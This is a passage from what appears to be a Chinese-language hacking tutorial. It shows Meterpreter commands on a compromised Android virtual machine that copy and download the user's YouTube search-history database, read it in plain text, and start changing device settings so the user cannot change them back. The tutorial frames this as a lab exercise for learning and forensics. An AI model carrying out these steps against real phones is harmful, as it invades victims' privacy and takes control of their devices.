    \ /data/data/com.metasploit.stage/files\n```\n\n9. 接下来，我们需要授予复制文件的访问权限：\n\n```\n\
    chmod 666 /data/data/com.metasploit.stage/files/history.db\n```\n\n10. 通过按 `CTRL-C`（在\
    \ Mac 上为 `CONTROL-C`）退出 Android shell。Meterpreter 将响应一个提示，询问你是否要终止 `channel` 或\
    \ shell 连接。输入 `y`。\n\n```\n^C\nTerminate channel 1? [y/N] y\n```\n\n11. 你现在将回到常规\
    \ Meterpreter 提示符，在那里你可以将 YouTube 历史记录文件下载到 Kali 虚拟机的主文件夹（`/home/kali/`）：\n\n\
    ```\nmeterpreter > download history.db\n```\n\n12. 在单独的终端窗口中，输入 `ls` 以确认 `history.db`\
    \ 文件已成功下载。然后输入 `cat history.db`，你将看到与在 Android shell 中看到的相同的文件内容，用户的 YouTube 搜索历史记录以纯文本形式显示。\n\
    \n恶意黑客可以使用此技术保存你的 YouTube 搜索历史记录。然而，如果你是为 FBI 或公司安全团队工作的取证数据分析师，你可以使用相同的技术来发现罪犯是否观看了\
    \ YouTube 视频以学习如何制造炸弹或犯下其他罪行。\n\n### 关闭铃声及更多操作\n\n你可以使用 Meterpreter 更改设置，并防止用户将其更改回来。例如，你可以通过在\
    \ Meterpreter 中输入以下命令来关闭 Android 虚拟机上的铃声：\n\n```\nmeterpreter > set_audio_mode\
